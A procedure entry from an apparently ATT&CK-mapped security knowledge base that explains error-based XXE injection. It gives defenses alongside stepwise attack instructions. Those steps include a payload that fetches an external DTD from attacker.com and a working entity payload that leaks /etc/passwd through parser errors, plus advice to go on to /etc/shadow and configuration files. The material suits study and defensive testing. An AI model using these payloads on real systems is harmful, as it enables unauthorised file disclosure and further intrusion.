---
type: procedure
description: >-
  Exploit XML parsers vulnerable to external entity processing to disclose
  sensitive files via error messages.
verified: true
submitted: false
created_at: '2024-01-01T00:00:00Z'
updated_at: '2024-01-01T00:00:00Z'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
  - '[[tactics/Collection|TA0009 - Collection]]'
techniques:
  - >-
    [[techniques/Exploitation of Remote Services|T1210 - Exploitation of Remote
    Services]]
sub_techniques: []
tags:
  - xxe
  - error-based-xxe
  - xml-external-entity
  - file-disclosure
commands: []
platforms:
  - Web
tools: []
validated: true
---

# Error-Based-XXE-Injection-Attack

## Summary

This procedure demonstrates how to perform an error-based XXE injection attack to extract sensitive information from a target application by exploiting XML parser vulnerabilities. By injecting malicious XML entities that reference local files, the parser generates error messages containing the file contents, enabling reconnaissance or data exfiltration without direct file access.

## Description

Error-based XXE (XML External Entity) injection exploits applications that parse user-supplied XML input without disabling external entity resolution. Attackers craft XML payloads that define entities referencing local resources (e.g., /etc/passwd). When the parser fails to resolve these (e.g., due to a non-existent path), it outputs the entity content in the error message, leaking sensitive data. This technique is effective against web applications using libraries like libxml2 or older Java XML parsers. It requires an input point accepting XML (e.g., SOAP APIs, file uploads) and is commonly used for initial reconnaissance, such as enumerating user accounts or configuration files, potentially leading to further exploitation like privilege escalation or arbitrary code execution.

## Requirements

1. Network access to a web application endpoint that accepts and parses XML input (e.g., POST requests to /api/upload).
2. Knowledge of the target XML structure and parser (e.g., via error messages or documentation).
3. Tools for sending HTTP requests, such as Burp Suite or curl, to inject and intercept payloads.
4. A controlled server to host external DTD files if needed for advanced payloads.

## Defense

Defensive measures and detection strategies:

- Disable external entity and DTD processing in XML parsers (e.g., set libxml_disable_entity_loader(true) in PHP).
- Implement strict input validation and sanitization to reject or escape XML entities in user input.
- Use modern XML parsers with built-in XXE protections, such as those in .NET or updated Java versions.
- Monitor application logs for XML parsing errors containing file paths or sensitive data leaks.
- Deploy Web Application Firewalls (WAFs) with XXE-specific rules to block malicious entity declarations.

## Objectives

1. Extract sensitive information from local files on the target server (e.g., /etc/passwd, config files).
2. Perform reconnaissance to identify system users, configurations, or other resources.
3. Escalate the attack by using leaked data for further exploits, such as credential guessing.
4. Achieve data exfiltration without triggering direct file read alerts.

## Instructions

### Step 1: Identify Vulnerable XML Input Endpoint

**Context**: Locate an application feature that processes XML input, such as a login form, file upload, or API endpoint. Test for XXE by sending a basic payload to confirm entity expansion.

Use a tool like Burp Suite to intercept and modify requests. Inject a simple external entity reference to check if the parser resolves it.

**Code** ([[codes/XXE-External-DTD-Reference-Payload]]):

```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % ext SYSTEM "http://attacker.com/ext.dtd">
    %ext;
]>
<message></message>
```

Submit this payload in the XML data field of the request. If successful, the application will attempt to fetch the external DTD, confirming vulnerability.

### Step 2: Craft Error-Based Payload for File Disclosure

**Context**: Once vulnerability is confirmed, construct a payload that forces an error to reveal file contents. This involves defining a parameter entity that references a local file and triggering a resolution error.

Modify the request to include the error-inducing entity. Target files like /etc/passwd for user enumeration.

**Code** ([[codes/Error-Based-XXE-File-Read-Payload]]):

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Intercept the response and examine error messages for leaked file contents. If /etc/passwd is disclosed, the attack succeeds, showing usernames and potentially hashed passwords.

### Step 3: Iterate and Escalate

**Context**: Use the leaked information to target additional files (e.g., /etc/shadow, application configs) or chain with other vulnerabilities.

Adjust the %file entity to point to other paths (e.g., "file:///var/www/config.xml"). Monitor responses for further disclosures and document findings for subsequent attacks.
